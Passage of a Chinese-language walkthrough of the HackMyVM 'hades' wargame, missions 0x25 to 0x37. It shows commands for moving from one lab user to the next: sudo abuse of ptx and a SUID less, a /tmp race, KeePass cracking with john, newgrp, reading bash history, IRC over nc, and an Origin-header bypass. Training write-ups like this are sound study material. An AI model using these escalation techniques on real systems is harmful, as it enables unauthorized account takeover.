<p>密码生成在&#x2F;tmp目录下的xxx文件，看了群主的wp，通过把tmp写满，让他把密码写在指定文件并且可读,那就删一个tmp下的目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">daphne@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /tmp/tao
-rw-r--r-- <span class="token number">1</span> daphne daphne <span class="token number">0</span> Jul  <span class="token number">3</span> 09:34 /tmp/tao
daphne@hades:~$ <span class="token function">rm</span> /tmp/tao</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">daphne@hades:~$ <span class="token keyword">while</span> <span class="token builtin class-name">:</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token parameter variable">-f</span> /tmp/tao <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">cat</span> /tmp/tao<span class="token punctuation">;</span> <span class="token keyword">done</span></code></pre>
<p>再开个端口利用死循环监听这个文件然后读,另一半执行sudo</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">daphne@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> daphne on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User daphne may run the following commands on hades:
    <span class="token punctuation">(</span>delia<span class="token punctuation">)</span> NOPASSWD: /bin/bash <span class="token parameter variable">-c</span> /usr/local/src/new.sh
daphne@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> delia /bin/bash <span class="token parameter variable">-c</span> /usr/local/src/new.sh</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">daphne@hades:~$ <span class="token keyword">while</span> <span class="token builtin class-name">:</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token parameter variable">-f</span> /tmp/tao <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">cat</span> /tmp/tao<span class="token punctuation">;</span> <span class="token keyword">done</span>
bNCvocyOpoMVeCtxrhTt
bNCvocyOpoMVeCtxrhTt
bNCvocyOpoMVeCtxrhTt
bNCvocyOpoMVeCtxrhTt
bNCvocyOpoMVeCtxrhTt
cat: /tmp/tao: No suc</code></pre>
<p>拿到密码<code>bNCvocyOpoMVeCtxrhTt</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">delia@hades:~$ <span class="token function">cat</span> flagz.txt 
^QfaHPyEqMepsOdMxQCQ^</code></pre>
<h2 id="MISSION-0x26"><a href="#MISSION-0x26" class="headerlink" title="MISSION 0x26"></a>MISSION 0x26</h2><pre class="language-bash" data-language="bash"><code class="language-bash">delia@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x26 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User demeter reads <span class="token keyword">in</span> another language.

<span class="token comment">## ES ##</span>
La usuaria demeter lee en otro idioma.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">delia@hades:~$ ./showpass 

FkyuXkkJNONDChoaKzOI</code></pre>
<p>为什么直接给密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">demeter@hades:~$ <span class="token function">cat</span> flagz.txt 
^JiviWHRVRZLSfjBuwAi^</code></pre>
<h2 id="MISSION-0x27"><a href="#MISSION-0x27" class="headerlink" title="MISSION 0x27"></a>MISSION 0x27</h2><pre class="language-bash" data-language="bash"><code class="language-bash">demeter@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x27 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user <span class="token builtin class-name">echo</span> permute.

<span class="token comment">## ES ##</span>
La usuaria <span class="token builtin class-name">echo</span> permuta.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">demeter@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> demeter on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User demeter may run the following commands on hades:
    <span class="token punctuation">(</span>echo<span class="token punctuation">)</span> NOPASSWD: /usr/bin/ptx
demeter@hades:~$ </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">demeter@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> <span class="token builtin class-name">echo</span> ptx <span class="token parameter variable">-w</span> <span class="token number">5000</span> /usr/local/games/echo_pass.txt
GztROerShmiyiCIlfepG</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">echo@hades:~$ <span class="token function">cat</span> flagz.txt 
^abeDeOxlPMAABepeBHy^</code></pre>
<h2 id="MISSION-0x28"><a href="#MISSION-0x28" class="headerlink" title="MISSION 0x28"></a>MISSION 0x28</h2><pre class="language-bash" data-language="bash"><code class="language-bash">echo@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x28 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user eos can see the sounds.

<span class="token comment">## ES ##</span>
La usuaria eos puede ver los sonidos.</code></pre>
<p>音频隐写?<br><img src="https://ooo.0x0.ooo/2024/07/06/OPL8Kc.png" alt="OPL8Kc.png" loading="lazy"><br><code>CWBKRQX</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">eos@hades:~$ <span class="token function">cat</span> flagz.txt 
^OsoLytPlXEjvinhCNyy^</code></pre>
<h2 id="MISSION-0x29"><a href="#MISSION-0x29" class="headerlink" title="MISSION 0x29"></a>MISSION 0x29</h2><pre class="language-bash" data-language="bash"><code class="language-bash">eos@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x29 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user gaia is very careful saving her passwords.

<span class="token comment">## ES ##</span>
La usuaria gaia es muy precavida guardando sus passwords.</code></pre>
<p>爆破</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"> ~/Desktop                                                                                                                                                                                                       INT  root@kali2  <span class="token number">16</span>:00:51 
<span class="token operator">></span> keepass2john secretz.kbdx <span class="token operator">></span> pass.txt   

 ~/Desktop                                                                                                                                                                                                            root@kali2  <span class="token number">16</span>:01:38 
<span class="token operator">></span> john pass.txt <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>KeePass <span class="token punctuation">[</span>SHA256 AES <span class="token number">32</span>/64<span class="token punctuation">]</span><span class="token punctuation">)</span>
Cost <span class="token number">1</span> <span class="token punctuation">(</span>iteration count<span class="token punctuation">)</span> is <span class="token number">60000</span> <span class="token keyword">for</span> all loaded hashes
Cost <span class="token number">2</span> <span class="token punctuation">(</span>version<span class="token punctuation">)</span> is <span class="token number">2</span> <span class="token keyword">for</span> all loaded hashes
Cost <span class="token number">3</span> <span class="token punctuation">(</span>algorithm <span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">=</span>AES <span class="token assign-left variable">1</span><span class="token operator">=</span>TwoFish <span class="token assign-left variable">2</span><span class="token operator">=</span>ChaCha<span class="token punctuation">]</span><span class="token punctuation">)</span> is <span class="token number">0</span> <span class="token keyword">for</span> all loaded hashes
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
heaven           <span class="token punctuation">(</span>secretz.kbdx<span class="token punctuation">)</span>     
1g <span class="token number">0</span>:00:00:02 DONE <span class="token punctuation">(</span><span class="token number">2024</span>-07-06 <span class="token number">16</span>:01<span class="token punctuation">)</span> <span class="token number">0</span>.4424g/s <span class="token number">82</span>.74p/s <span class="token number">82</span>.74c/s <span class="token number">82</span>.74C/s heaven
Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliably
Session completed. </code></pre>
<p>打开密码是<code>heaven</code><br><img src="https://ooo.0x0.ooo/2024/07/06/OPLX0r.png" alt="OPLX0r.png" loading="lazy"><br><code>sbUcegcdYTTWzTKojzgm</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">gaia@hades:~$ <span class="token function">cat</span> flagz.txt 
^NWelryzwJowjEaDWEiY^</code></pre>
<h2 id="MISSION-0x30"><a href="#MISSION-0x30" class="headerlink" title="MISSION 0x30"></a>MISSION 0x30</h2><pre class="language-bash" data-language="bash"><code class="language-bash">gaia@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x30 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User halcyon wants all the powah.

<span class="token comment">## ES ##</span>
La usuaria halcyon quiere todo el powah.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">gaia@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">40</span>
drwxr-x--- <span class="token number">2</span> root gaia  <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root root  <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> gaia gaia   <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> gaia gaia  <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> gaia gaia   <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r----- <span class="token number">1</span> root gaia    <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root gaia    <span class="token number">10</span> Apr  <span class="token number">5</span> 06:36 hpass1.txt
-rw-r----- <span class="token number">1</span> root powah   <span class="token number">23</span> Apr  <span class="token number">5</span> 06:36 hpass2.txt
-rw-r----- <span class="token number">1</span> root gaia   <span class="token number">146</span> Apr  <span class="token number">5</span> 06:36 mission.txt
gaia@hades:~$ <span class="token function">cat</span> hpass1.txt 

manuela

gaia@hades:~$ <span class="token function">cat</span> hpass2.txt 
cat: hpass2.txt: Permission denied</code></pre>
<p>第二个文件组是powah，尝试切换到这个用户组,用<code>manuela</code>即可创建</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">gaia@hades:~$ newgrp powah
Password: 
gaia@hades:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2021</span><span class="token punctuation">(</span>gaia<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>powah<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>powah<span class="token punctuation">)</span>,2021<span class="token punctuation">(</span>gaia<span class="token punctuation">)</span>
gaia@hades:~$ <span class="token function">cat</span> hpass2.txt 

cuMRRameGdmhVxHcYYYs</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">halcyon@hades:~$ <span class="token function">cat</span> flagz.txt 
^YBkkiwOiBVdzLnxXPdU^</code></pre>
<h2 id="MISSION-0x31"><a href="#MISSION-0x31" class="headerlink" title="MISSION 0x31"></a>MISSION 0x31</h2><pre class="language-bash" data-language="bash"><code class="language-bash">halcyon@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x31 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user hebe has one <span class="token string">'magicword'</span> to get her password using http://localhost/req.php 

<span class="token comment">## ES ##</span>
La usuaria hebe tiene una <span class="token string">'magicword'</span> para obtener <span class="token function">su</span> password usando http://localhost/req.php</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">halcyon@hades:~$ <span class="token function">curl</span> http://localhost/req.php?magicword<span class="token operator">=</span>password

tOlbuBLjFWntVDNmjHIG</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">hebe@hades:~$ <span class="token function">cat</span> flagz.txt 
^BAWnwGCghvcBbbRcZVd^</code></pre>
<h2 id="MISSION-0x32"><a href="#MISSION-0x32" class="headerlink" title="MISSION 0x32"></a>MISSION 0x32</h2><pre class="language-bash" data-language="bash"><code class="language-bash">hebe@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x32 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User hera refuses to use Discord, she prefer an older and <span class="token function">open</span> <span class="token builtin class-name">source</span> service.

<span class="token comment">## ES ##</span>
La usuaria hera se niega a usar Discord, prefiere un medio mas antiguo y abierto.</code></pre>
<p>不用discord，用的老的交流工具，确实不知道，看了别人的wp发现是irc，默认在6667端口</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hebe@hades:~$ /var/tmp/446 <span class="token parameter variable">-tunlnp</span>
Netid                   State                    Recv-Q                   Send-Q                                      Local Address:Port                                        Peer Address:Port                   Process                   
udp                     UNCONN                   <span class="token number">0</span>                        <span class="token number">0</span>                                              <span class="token number">127.0</span>.0.11:56483                                            <span class="token number">0.0</span>.0.0:*                                                
udp                     UNCONN                   <span class="token number">0</span>                        <span class="token number">0</span>                                                 <span class="token number">0.0</span>.0.0:44595                                            <span class="token number">0.0</span>.0.0:*                                                
udp                     UNCONN                   <span class="token number">0</span>                        <span class="token number">0</span>                                                 <span class="token number">0.0</span>.0.0:55168                                            <span class="token number">0.0</span>.0.0:*                                                
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">4096</span>                                           <span class="token number">127.0</span>.0.11:38595                                            <span class="token number">0.0</span>.0.0:*                                                
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">128</span>                                             <span class="token number">127.0</span>.0.1:6667                                             <span class="token number">0.0</span>.0.0:*                                                
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">511</span>                                               <span class="token number">0.0</span>.0.0:80                                               <span class="token number">0.0</span>.0.0:*                                                
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">128</span>                                               <span class="token number">0.0</span>.0.0:22                                               <span class="token number">0.0</span>.0.0:*                                                
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">1024</span>                                                    *:1965                                                   *:*                                                
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">511</span>                                                  <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:80                                                  <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*                                                
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">32</span>                                                      *:21                                                     *:*                                                
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">128</span>                                                  <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:22                                                  <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*     </code></pre>
<p>确实开放了6667端口<br><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-irc">https://book.hacktricks.xyz/network-services-pentesting/pentesting-irc</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hebe@hades:~$ /var/tmp/nc <span class="token number">127.0</span>.0.1 <span class="token number">6667</span>
hebe@hades:~$ /var/tmp/busybox <span class="token function">nc</span> <span class="token number">127.0</span>.0.1 <span class="token number">6667</span>
:hades.hmv NOTICE * :*** Looking up your hostname<span class="token punctuation">..</span>.
:hades.hmv NOTICE * :*** Could not resolve your hostname: Request timed out<span class="token punctuation">;</span> using your IP address <span class="token punctuation">(</span><span class="token number">127.0</span>.0.1<span class="token punctuation">)</span> instead.
<span class="token environment constant">USER</span> ran213eqdw123 <span class="token number">0</span> * ran213eqdw123
NICK ran213eqdw123
:hades.hmv 001 ran213eqdw123 :Welcome to the Devilnet IRC Network ran213eqdw123<span class="token operator">!</span>ran213eqdw@127.0.0.1
:hades.hmv 002 ran213eqdw123 :Your <span class="token function">host</span> is hades.hmv, running version InspIRCd-3
:hades.hmv 003 ran213eqdw123 :This server was created <span class="token number">20</span>:29:01 Jun 06 <span class="token number">2024</span>
:hades.hmv 004 ran213eqdw123 hades.hmv InspIRCd-3 iosw Pbiklmnopstv :bklov
:hades.hmv 005 ran213eqdw123 <span class="token assign-left variable">AWAYLEN</span><span class="token operator">=</span><span class="token number">200</span> <span class="token assign-left variable">CASEMAPPING</span><span class="token operator">=</span>rfc1459 <span class="token assign-left variable">CHANLIMIT</span><span class="token operator">=</span><span class="token comment">#:20 CHANMODES=b,k,l,Pimnpst CHANNELLEN=64 CHANTYPES=# ELIST=CMNTU HOSTLEN=64 KEYLEN=32 KICKLEN=255 LINELEN=512 MAXLIST=b:100 :are supported by this server</span>
:hades.hmv 005 ran213eqdw123 <span class="token assign-left variable">MAXTARGETS</span><span class="token operator">=</span><span class="token number">20</span> <span class="token assign-left variable">MODES</span><span class="token operator">=</span><span class="token number">20</span> <span class="token assign-left variable">NAMELEN</span><span class="token operator">=</span><span class="token number">128</span> <span class="token assign-left variable">NETWORK</span><span class="token operator">=</span>Devilnet <span class="token assign-left variable">NICKLEN</span><span class="token operator">=</span><span class="token number">30</span> <span class="token assign-left variable">PREFIX</span><span class="token operator">=</span><span class="token punctuation">(</span>ov<span class="token punctuation">)</span>@+ SAFELIST <span class="token assign-left variable">STATUSMSG</span><span class="token operator">=</span>@+ <span class="token assign-left variable">TOPICLEN</span><span class="token operator">=</span><span class="token number">307</span> <span class="token assign-left variable">USERLEN</span><span class="token operator">=</span><span class="token number">10</span> <span class="token assign-left variable">USERMODES</span><span class="token operator">=</span>,,s,iow WHOX :are supported by this server
:hades.hmv <span class="token number">251</span> ran213eqdw123 :There are <span class="token number">0</span> <span class="token function">users</span> and <span class="token number">0</span> invisible on <span class="token number">1</span> servers
:hades.hmv <span class="token number">253</span> ran213eqdw123 <span class="token number">1</span> :unknown connections
:hades.hmv <span class="token number">254</span> ran213eqdw123 <span class="token number">1</span> :channels formed
:hades.hmv <span class="token number">255</span> ran213eqdw123 :I have <span class="token number">0</span> clients and <span class="token number">0</span> servers
:hades.hmv <span class="token number">265</span> ran213eqdw123 :Current <span class="token builtin class-name">local</span> users: <span class="token number">0</span>  Max: <span class="token number">3</span>
:hades.hmv <span class="token number">266</span> ran213eqdw123 :Current global users: <span class="token number">0</span>  Max: <span class="token number">3</span>
:hades.hmv <span class="token number">422</span> ran213eqdw123 :Message of the day <span class="token function">file</span> is missing.
LISTS
:hades.hmv <span class="token number">421</span> ran213eqdw123 LISTS :Unknown <span class="token builtin class-name">command</span>
LIST
:hades.hmv <span class="token number">321</span> ran213eqdw123 Channel :Users Name
:hades.hmv <span class="token number">322</span> ran213eqdw123 <span class="token comment">#channel666 0 :[+Pnt] Welcome hacker! Take it: JzpyRXRzWoHKZwgWzleM</span>
:hades.hmv <span class="token number">323</span> ran213eqdw123 :End of channel list.</code></pre>
<p>拿到密码<code>JzpyRXRzWoHKZwgWzleM</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hera@hades:~$ <span class="token function">cat</span> flagz.txt 
^GaIAyNGsSRYClSuzVLX^</code></pre>
<h2 id="MISSION-0x33"><a href="#MISSION-0x33" class="headerlink" title="MISSION 0x33"></a>MISSION 0x33</h2><pre class="language-bash" data-language="bash"><code class="language-bash">hera@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x33 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User hermione would like to know what hera was doing. 

<span class="token comment">## ES ##</span>
A la usuaria hermione le gustaria saber que hacia hera.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">hera@hades:~$ <span class="token function">cat</span> .bash_history 

<span class="token function">ls</span>
<span class="token function">ps</span>
<span class="token function">sudo</span> <span class="token parameter variable">-u</span> hermione <span class="token function">bash</span>
<span class="token function">cp</span> /etc /etc2
^LVFcQoSJeZgUltXJKnpZ^
<span class="token function">ls</span>
<span class="token function">id</span>
<span class="token function">cat</span> /usr/hera
<span class="token function">rm</span> /usr/hera
<span class="token function">whoami</span>
<span class="token function">zip</span> <span class="token parameter variable">-R</span> etc.zip /etc</code></pre>
<p>拿到了一个flag <code>^LVFcQoSJeZgUltXJKnpZ^</code>，<br>注意到<code>/usr/hera</code>这个目录,发现里面写着密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hera@hades:/usr$ <span class="token function">cat</span> hera
vzhOebSSplFoXPKxwtqU</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">hermione@hades:~$ <span class="token function">cat</span> flagz.txt 
^dLcEkLNgdDvOlxtPhjh^</code></pre>
<h2 id="MISSION-0x34"><a href="#MISSION-0x34" class="headerlink" title="MISSION 0x34"></a>MISSION 0x34</h2><pre class="language-bash" data-language="bash"><code class="language-bash">hermione@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x34 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User hero only talks to some groups.

<span class="token comment">## ES ##</span>
La usuaria hero solo se habla con algunos grupos.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">hermione@hades:~$ ./beastgroup 

I only trust group <span class="token number">6666</span>, you are group <span class="token number">2025</span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/06/OPLIMM.png" alt="OPLIMM.png" loading="lazy"><br>反编译直接拿到密码了<code>vlImTDSGnTMwLFgRWCOc</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hero@hades:~$ <span class="token function">cat</span> flagz.txt 
^KUEUoYgCWKlUTpywGeK^</code></pre>
<h2 id="MISSION-0x35"><a href="#MISSION-0x35" class="headerlink" title="MISSION 0x35"></a>MISSION 0x35</h2><pre class="language-bash" data-language="bash"><code class="language-bash">hero@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x35 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User hestia likes to keep the <span class="token function">screen</span> clean.

<span class="token comment">## ES ##</span>
A la usuaria hestia le gusta mantener la pantalla limpia.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">hero@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">48</span>
drwxr-x--- <span class="token number">2</span> root hero  <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root root  <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> hero hero   <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> hero hero  <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> hero hero   <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
---s--s--- <span class="token number">1</span> root hero <span class="token number">16056</span> Apr  <span class="token number">5</span> 06:36 cleaner
-rw-r----- <span class="token number">1</span> root hero    <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root hero   <span class="token number">173</span> Apr  <span class="token number">5</span> 06:36 mission.txt</code></pre>
<p>注意到cleaner有suid权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hero@hades:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2026</span><span class="token punctuation">(</span>hero<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2226</span><span class="token punctuation">(</span>her0<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2226</span><span class="token punctuation">(</span>her0<span class="token punctuation">)</span>,2026<span class="token punctuation">(</span>hero<span class="token punctuation">)</span></code></pre>
<p>权限组根uid不同,看看这个组的其他文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hero@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-group</span> her0 <span class="token parameter variable">-type</span> f <span class="token parameter variable">-exec</span> <span class="token function">ls</span> <span class="token parameter variable">-l</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> + <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> proc
-rw-r----- <span class="token number">1</span> root her0 <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 /usr/share/libs</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">hero@hades:~$ <span class="token function">cat</span> /usr/share/libs
opTNnZQAuFJsauNPHXVq</code></pre>
<p>读取发现密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hestia@hades:~$ <span class="token function">cat</span> flagz.txt 
^mIZKIDJYZQDogbkwRGy^</code></pre>
<h2 id="MISSION-0x36"><a href="#MISSION-0x36" class="headerlink" title="MISSION 0x36"></a>MISSION 0x36</h2><pre class="language-bash" data-language="bash"><code class="language-bash">hestia@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x36 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User ianthe has left us her own less.

<span class="token comment">## ES ##</span>
La usuaria ianthe nos ha dejado <span class="token function">su</span> propio less.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">hestia@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">228</span>
drwxr-x--- <span class="token number">2</span> root   hestia   <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root   root     <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> hestia hestia    <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> hestia hestia   <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> hestia hestia    <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r----- <span class="token number">1</span> root   hestia     <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-r-s--s--- <span class="token number">1</span> ianthe hestia <span class="token number">198960</span> Apr  <span class="token number">5</span> 06:36 <span class="token function">less</span>
-rw-r----- <span class="token number">1</span> root   hestia    <span class="token number">157</span> Apr  <span class="token number">5</span> 06:36 mission.txt</code></pre>
<p>less所有者是ianthe,直接读ianthe的密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hestia@hades:~$ ./less /opt/ianthe_pass.txt
DphioLqgVIIFclTwBsMP</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">ianthe@hades:~$ <span class="token function">cat</span> flagz.txt 
^SdoibXIPAdqIdzDrYId^</code></pre>
<h2 id="MISSION-0x37"><a href="#MISSION-0x37" class="headerlink" title="MISSION 0x37"></a>MISSION 0x37</h2><pre class="language-bash" data-language="bash"><code class="language-bash">ianthe@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x37 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
Seems that irene is developing an auth system http://localhost/irene_auth.php only accessible by hackmyvm.hmv.
<span class="token punctuation">(</span>No bruteforce required, just some <span class="token string">"admin"</span> default pass <span class="token builtin class-name">:</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
<span class="token comment">## ES ##</span>
Parece que irene esta desarrollando algun sistema de autenticacion http://localhost/irene_auth.php solo accesible por hackmyvm.hmv.
<span class="token punctuation">(</span>No se requiere bruteforce, solo algunas pass por defecto de <span class="token string">"admin"</span> <span class="token builtin class-name">:</span><span class="token punctuation">)</span> <span class="token punctuation">)</span></code></pre>
<p>试了好多发现Origin有效</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ianthe@hades:~$ <span class="token function">curl</span> <span class="token parameter variable">-H</span> <span class="token string">"Origin: hackmyvm.hmv"</span> http://localhost/irene_auth.php

            <span class="token operator">&lt;</span>form <span class="token assign-left variable">method</span><span class="token operator">=</span><span class="token string">"post"</span> <span class="token assign-left variable">action</span><span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span>
                <span class="token operator">&lt;</span>label <span class="token assign-left variable">for</span><span class="token operator">=</span><span class="token string">"username"</span><span class="token operator">></span>Username:<span class="token operator">&lt;</span>/label<span class="token operator">></span>
                <span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"text"</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">"username"</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"username"</span> required<span class="token operator">></span>
                <span class="token operator">&lt;</span>br<span class="token operator">></span>
